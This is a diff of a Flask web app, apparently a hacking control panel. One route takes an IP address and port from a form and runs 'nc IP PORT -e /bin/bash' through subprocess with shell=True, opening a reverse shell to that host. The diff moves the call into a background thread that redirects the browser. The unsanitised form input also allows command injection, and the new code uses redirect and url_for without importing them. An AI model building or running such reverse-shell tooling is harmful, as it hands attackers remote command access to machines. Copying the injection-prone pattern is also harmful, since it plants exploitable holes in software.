@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request
 import subprocess
 import paramiko
+import threading
 
 app = Flask(__name__)
 
@@ -19,6 +20,10 @@ def get_hotspot_interface(connection_name):
         return result.stdout.strip()
     except Exception as e:
         return None
+    
+def run_reverse_shell(ip, port):
+    command = f"nc {ip} {port} -e /bin/bash"
+    subprocess.run(command, shell=True)
 
 @app.route('/')
 def home():
@@ -77,25 +82,13 @@ def opcao3():
         ip = request.form['ip']
         port = request.form['port']
 
-        # Comando para estabelecer a conexão de shell reverso
-        command = f"nc {ip} {port} -e /bin/bash"
-        try:
-            # Executa o comando
-            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = result.stdout.decode() + result.stderr.decode()
-
-            # Script JavaScript para redirecionar o navegador
-            redirect_script = """
-            <script type="text/javascript">
-                window.location.href = "/";
-            </script>
-            """
-            return output + redirect_script
-        except subprocess.CalledProcessError as e:
-            return f"Erro ao executar o comando: {e}"
+        # Inicia a thread para executar o comando de forma assíncrona
+        thread = threading.Thread(target=run_reverse_shell, args=(ip, port))
+        thread.start()
+        # Redireciona o navegador para a página inicial
+        return redirect(url_for('home'))
 
     return render_template('reverse_shell_input.html')
-
 @app.route('/opcao4', methods=['GET', 'POST'])
 def opcao4():
     if request.method == 'POST':
